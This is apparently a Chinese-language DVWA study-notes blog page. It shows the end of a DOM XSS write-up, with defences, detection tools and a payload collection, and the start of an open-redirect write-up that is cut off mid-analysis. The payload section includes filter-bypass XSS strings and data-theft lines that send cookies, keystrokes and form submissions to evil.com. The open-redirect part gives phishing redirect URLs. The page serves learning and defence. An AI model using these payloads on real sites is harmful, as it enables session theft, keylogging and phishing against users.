<h4 id="5-使用DOMPurify库"><a href="#5-使用DOMPurify库" class="headerlink" title="5. 使用DOMPurify库"></a>5. 使用DOMPurify库</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 引入DOMPurify</span></span><br><span class="line">&lt;script src=<span class="string">&quot;https://cdnjs.cloudflare.com/ajax/libs/dompurify/2.4.0/purify.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 清理HTML</span></span><br><span class="line"><span class="keyword">var</span> clean = <span class="title class_">DOMPurify</span>.<span class="title function_">sanitize</span>(dirtyHTML);</span><br><span class="line">element.<span class="property">innerHTML</span> = clean;</span><br></pre></td></tr></table></figure>

<h3 id="框架层面"><a href="#框架层面" class="headerlink" title="框架层面"></a>框架层面</h3><h4 id="React示例"><a href="#React示例" class="headerlink" title="React示例"></a>React示例</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// React自动转义</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Component</span>(<span class="params">&#123; userInput &#125;</span>) &#123;</span><br><span class="line">    <span class="comment">// 安全：自动转义</span></span><br><span class="line">    <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;userInput&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 危险：dangerouslySetInnerHTML</span></span><br><span class="line">    <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">dangerouslySetInnerHTML</span>=<span class="string">&#123;&#123;</span> <span class="attr">__html:</span> <span class="attr">userInput</span> &#125;&#125; /&gt;</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="Vue示例"><a href="#Vue示例" class="headerlink" title="Vue示例"></a>Vue示例</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 安全：自动转义 --&gt;</span><br><span class="line">&lt;div&gt;&#123;&#123; userInput &#125;&#125;&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 危险：v-html --&gt;</span><br><span class="line">&lt;div v-html=&quot;userInput&quot;&gt;&lt;/div&gt;</span><br></pre></td></tr></table></figure>

<h4 id="Angular示例"><a href="#Angular示例" class="headerlink" title="Angular示例"></a>Angular示例</h4><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Angular自动清理</span></span><br><span class="line"><span class="meta">@Component</span>(&#123;</span><br><span class="line">    <span class="attr">template</span>: <span class="string">&#x27;&lt;div&gt;&#123;&#123; userInput &#125;&#125;&lt;/div&gt;&#x27;</span>  <span class="comment">// 安全</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用DomSanitizer</span></span><br><span class="line"><span class="title function_">constructor</span>(<span class="params"><span class="keyword">private</span> sanitizer: DomSanitizer</span>) &#123;&#125;</span><br><span class="line"><span class="keyword">get</span> <span class="title function_">safeHtml</span>() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">sanitizer</span>.<span class="title function_">sanitize</span>(<span class="title class_">SecurityContext</span>.<span class="property">HTML</span>, <span class="variable language_">this</span>.<span class="property">userInput</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="检测工具"><a href="#检测工具" class="headerlink" title="检测工具"></a>检测工具</h3><ol>
<li><p><strong>手动审计</strong></p>
<ul>
<li>搜索危险的Sinks: <code>innerHTML</code>, <code>document.write</code>, <code>eval</code></li>
<li>检查Sources: <code>location.hash</code>, <code>location.search</code>, <code>document.URL</code></li>
<li>追踪数据流: Source → Processing → Sink</li>
</ul>
</li>
<li><p><strong>自动化工具</strong></p>
<ul>
<li><strong>DOM Invader</strong> (Burp Suite扩展)</li>
<li><strong>DOM XSS Scanner</strong></li>
<li><strong>ESLint + security插件</strong></li>
</ul>
</li>
<li><p><strong>浏览器DevTools</strong></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在Console中测试</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">hash</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">document</span>.<span class="property">URL</span>);</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="监控层面"><a href="#监控层面" class="headerlink" title="监控层面"></a>监控层面</h3><ol>
<li><p><strong>CSP Report</strong></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">content</span>=<span class="string">&quot;default-src &#x27;self&#x27;; report-uri /csp-report&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>日志记录</strong></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 记录异常的输入</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_">isValidInput</span>(input)) &#123;</span><br><span class="line">    <span class="title function_">logSecurityEvent</span>(<span class="string">&#x27;Invalid DOM input detected&#x27;</span>, input);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<hr>
<h2 id="总结对比"><a href="#总结对比" class="headerlink" title="总结对比"></a>总结对比</h2><table>
<thead>
<tr>
<th>特性</th>
<th>Low</th>
<th>Medium</th>
<th>High</th>
<th>Impossible</th>
</tr>
</thead>
<tbody><tr>
<td>输入验证</td>
<td>❌</td>
<td>过滤<script></td>
<td>白名单</td>
<td>严格白名单</td>
</tr>
<tr>
<td>输出方法</td>
<td>document.write</td>
<td>document.write</td>
<td>document.write</td>
<td>textContent</td>
</tr>
<tr>
<td>编码处理</td>
<td>❌</td>
<td>❌</td>
<td>❌</td>
<td>✅ decodeURIComponent</td>
</tr>
<tr>
<td>白名单</td>
<td>❌</td>
<td>❌</td>
<td>Switch-case</td>
<td>对象映射</td>
</tr>
<tr>
<td>安全Sink</td>
<td>❌</td>
<td>❌</td>
<td>❌</td>
<td>✅ createElement</td>
</tr>
<tr>
<td>服务器参与</td>
<td>❌</td>
<td>❌</td>
<td>❌</td>
<td>❌（纯前端）</td>
</tr>
<tr>
<td>攻击难度</td>
<td>极易</td>
<td>简单</td>
<td>难</td>
<td>不可能</td>
</tr>
</tbody></table>
<hr>
<h2 id="常用Payload集合"><a href="#常用Payload集合" class="headerlink" title="常用Payload集合"></a>常用Payload集合</h2><h3 id="基础Payload"><a href="#基础Payload" class="headerlink" title="基础Payload"></a>基础Payload</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- &lt;script&gt;标签 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">http://evil.com/xss.js</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- &lt;img&gt;标签 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(document.cookie)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">&quot;fetch(&#x27;http://evil.com/?c=&#x27;+document.cookie)&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- &lt;svg&gt;标签 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- &lt;iframe&gt;标签 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">javascript:alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;data:text/html,&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="绕过过滤"><a href="#绕过过滤" class="headerlink" title="绕过过滤"></a>绕过过滤</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 大小写混淆 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ScRiPt</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)</span><span class="tag">&lt;/<span class="name">ScRiPt</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">x</span> <span class="attr">ONERROR</span>=<span class="string">alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 编码 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">\u0061\u006c\u0065\u0072\u0074(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 空格替代 --&gt;</span></span><br><span class="line">&lt;img/src=x/onerror=alert(&#x27;XSS&#x27;)&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span>	<span class="attr">src</span>=<span class="string">x</span>	<span class="attr">onerror</span>=<span class="string">alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 无引号 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(String.fromCharCode(88,83,83))</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="窃取数据"><a href="#窃取数据" class="headerlink" title="窃取数据"></a>窃取数据</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Cookie窃取 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">document</span>.<span class="property">location</span>=<span class="string">&#x27;http://evil.com/?c=&#x27;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">&quot;fetch(&#x27;http://evil.com/?c=&#x27;+document.cookie)&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 键盘记录 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">document</span>.<span class="property">onkeypress</span>=<span class="function"><span class="params">e</span>=&gt;</span><span class="title function_">fetch</span>(<span class="string">&#x27;http://evil.com/?k=&#x27;</span>+e.<span class="property">key</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 表单劫持 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">document</span>.<span class="property">forms</span>[<span class="number">0</span>].<span class="property">action</span>=<span class="string">&#x27;http://evil.com/phish&#x27;</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<hr>
<h2 id="实战建议"><a href="#实战建议" class="headerlink" title="实战建议"></a>实战建议</h2><p><strong>学习路径：</strong></p>
<ol>
<li><strong>Low难度</strong> - 理解DOM XSS原理和数据流</li>
<li><strong>Medium难度</strong> - 学习绕过简单过滤</li>
<li><strong>High难度</strong> - 理解白名单防御</li>
<li><strong>Impossible难度</strong> - 掌握完善的防御机制</li>
</ol>
<p><strong>攻击技巧：</strong></p>
<ul>
<li>使用浏览器DevTools观察DOM操作</li>
<li>寻找Source→Sink的数据流</li>
<li>测试各种HTML标签和事件处理器</li>
<li>利用URL Fragment（#）绕过WAF</li>
</ul>
<p><strong>检测技巧：</strong></p>
<ul>
<li>搜索<code>innerHTML</code>、<code>document.write</code>、<code>eval</code></li>
<li>检查<code>location.hash</code>、<code>document.URL</code>的使用</li>
<li>使用DOM Invader工具自动检测</li>
<li>审计JavaScript代码的数据流</li>
</ul>
<p><strong>防御重点：</strong></p>
<ul>
<li>使用<code>textContent</code>而不是<code>innerHTML</code></li>
<li>实施严格的白名单验证</li>
<li>避免<code>eval()</code>、<code>document.write()</code></li>
<li>实施CSP策略</li>
<li>使用安全的框架（React、Vue等）</li>
</ul>
<p><strong>道德准则：</strong></p>
<ul>
<li>只在授权环境测试</li>
<li>不利用DOM XSS攻击真实用户</li>
<li>学习是为了构建安全的应用</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en,zh-CN,default">
    <link itemprop="mainEntityOfPage" href="http://caixuya.github.io/2025/11/20/Open_HTTP_Redirect_%E6%94%BB%E9%98%B2%E7%BB%83%E4%B9%A0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="caixuya">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="tia的学习笔记">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/11/20/Open_HTTP_Redirect_%E6%94%BB%E9%98%B2%E7%BB%83%E4%B9%A0/" class="post-title-link" itemprop="url">DVWA - Open HTTP Redirect (开放重定向) 攻防练习详解</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2025-11-20 23:31:37 / Modified: 23:27:11" itemprop="dateCreated datePublished" datetime="2025-11-20T23:31:37+08:00">2025-11-20</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/dvwa%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">dvwa靶场学习笔记</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>17k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>15 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><ul>
<li><a href="#%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B">漏洞简介</a></li>
<li><a href="#low-%E9%9A%BE%E5%BA%A6">Low 难度</a></li>
<li><a href="#medium-%E9%9A%BE%E5%BA%A6">Medium 难度</a></li>
<li><a href="#high-%E9%9A%BE%E5%BA%A6">High 难度</a></li>
<li><a href="#impossible-%E9%9A%BE%E5%BA%A6">Impossible 难度</a></li>
<li><a href="#%E9%98%B2%E5%BE%A1%E5%BB%BA%E8%AE%AE">防御建议</a></li>
</ul>
<hr>
<h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><h3 id="什么是开放重定向（Open-Redirect）？"><a href="#什么是开放重定向（Open-Redirect）？" class="headerlink" title="什么是开放重定向（Open Redirect）？"></a>什么是开放重定向（Open Redirect）？</h3><p>开放重定向漏洞允许攻击者控制应用程序的重定向目标，将用户重定向到任意外部网站。虽然看似危害较小，但可用于钓鱼攻击和绕过安全控制。</p>
<p><strong>HTTP重定向机制：</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 方法1：HTTP响应头</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: https://example.com&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 方法2：HTML meta标签</span></span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;refresh&quot;</span> content=<span class="string">&quot;0;url=https://example.com&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 方法3：JavaScript</span></span><br><span class="line">window.location = <span class="string">&quot;https://example.com&quot;</span>;</span><br></pre></td></tr></table></figure>

<p><strong>攻击场景：</strong></p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">合法使用：</span><br><span class="line">https:<span class="regexp">//</span>example.com<span class="regexp">/redirect?url=https:/</span><span class="regexp">/example.com/</span>success</span><br><span class="line">→ 重定向到同域名的成功页面</span><br><span class="line"></span><br><span class="line">恶意利用：</span><br><span class="line">https:<span class="regexp">//</span>example.com<span class="regexp">/redirect?url=https:/</span><span class="regexp">/evil.com/</span>phishing</span><br><span class="line">→ 重定向到钓鱼网站</span><br></pre></td></tr></table></figure>

<p><strong>危害：</strong></p>
<ol>
<li><p><strong>钓鱼攻击</strong></p>
<ul>
<li>用户信任合法域名</li>
<li>被重定向到伪造网站</li>
<li>输入凭证被窃取</li>
</ul>
</li>
<li><p><strong>绕过安全控制</strong></p>
<ul>
<li>绕过URL黑名单</li>
<li>绕过SSRF防护</li>
<li>绕过CSP策略</li>
</ul>
</li>
<li><p><strong>会话劫持</strong></p>
<ul>
<li>重定向时泄露Session ID</li>
<li>Referer头包含敏感信息</li>
</ul>
</li>
<li><p><strong>恶意软件分发</strong></p>
<ul>
<li>利用信任关系传播恶意软件</li>
</ul>
</li>
</ol>
<p><strong>利用链：</strong></p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>. 攻击者发送：https:<span class="regexp">//</span>bank.com<span class="regexp">/redirect?url=https:/</span><span class="regexp">/evil.com/</span>fake-login</span><br><span class="line"><span class="number">2</span>. 用户点击（信任bank.com域名）</span><br><span class="line"><span class="number">3</span>. 自动重定向到evil.com</span><br><span class="line"><span class="number">4</span>. 用户看到伪造的登录页面</span><br><span class="line"><span class="number">5</span>. 输入凭证 → 被窃取</span><br></pre></td></tr></table></figure>

<p><strong>DVWA场景：</strong><br>一个登录后的重定向功能，用于跳转到指定页面。</p>
<hr>
<h2 id="Low-难度"><a href="#Low-难度" class="headerlink" title="Low 难度"></a>Low 难度</h2><h3 id="攻击目标"><a href="#攻击目标" class="headerlink" title="攻击目标"></a>攻击目标</h3><p>完全不验证重定向目标，可重定向到任意URL。</p>
<h3 id="后端代码分析"><a href="#后端代码分析" class="headerlink" title="后端代码分析"></a>后端代码分析</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查是否有重定向参数</span></span><br><span class="line"><span class="comment">// isset() - 检查变量是否存在</span></span><br><span class="line"><span class="comment">// $_GET[&#x27;redirect&#x27;] - 从URL获取重定向参数</span></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;redirect&#x27;</span> ] ) ) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 危险操作：直接获取用户输入，无任何验证 ★★★</span></span><br><span class="line">    <span class="comment">// 攻击者可以指定任意URL</span></span><br><span class="line">    <span class="comment">// 例如：?redirect=https://evil.com</span></span><br><span class="line">    <span class="variable">$redirect</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;redirect&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 危险操作：直接重定向到用户指定的URL ★★★</span></span><br><span class="line">    <span class="comment">// header() - 设置HTTP响应头</span></span><br><span class="line">    <span class="comment">// Location - 重定向到指定URL</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// 问题：</span></span><br><span class="line">    <span class="comment">// 1. 不检查URL是否是内部链接</span></span><br><span class="line">    <span class="comment">// 2. 不检查URL是否是合法域名</span></span><br><span class="line">    <span class="comment">// 3. 不验证URL格式</span></span><br><span class="line">    <span class="comment">// 4. 攻击者可以重定向到任何网站</span></span><br><span class="line">    <span class="title function_ invoke__">header</span>( <span class="string">&quot;Location: &quot;</span> . <span class="variable">$redirect</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 应该调用exit()停止脚本执行 ★★★</span></span><br><span class="line">    <span class="comment">// 但这里没有，可能导致额外问题</span></span><br><span class="line">    <span class="comment">// exit;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>HTML表单：</strong></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Redirect<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Redirect Example<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 合法使用：重定向到内部页面 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;?redirect=success.php&quot;</span>&gt;</span>Go to success page<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;?redirect=dashboard.php&quot;</span>&gt;</span>Go to dashboard<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- ★★★ 恶意利用：重定向到外部网站 ★★★ --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 攻击者可以构造这样的链接 --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- &lt;a href=&quot;?redirect=https://evil.com/phishing&quot;&gt;Click here&lt;/a&gt; --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p><strong>核心问题：</strong></p>
<ol>
<li><strong>无URL验证</strong> - 接受任意URL</li>
<li><strong>无域名检查</strong> - 不限制目标域名</li>
<li><strong>无协议检查</strong> - http、https、javascript:都接受</li>
<li><strong>无白名单</strong> - 没有允许的URL列表</li>
</ol>
<p><strong>攻击数据流：</strong></p>
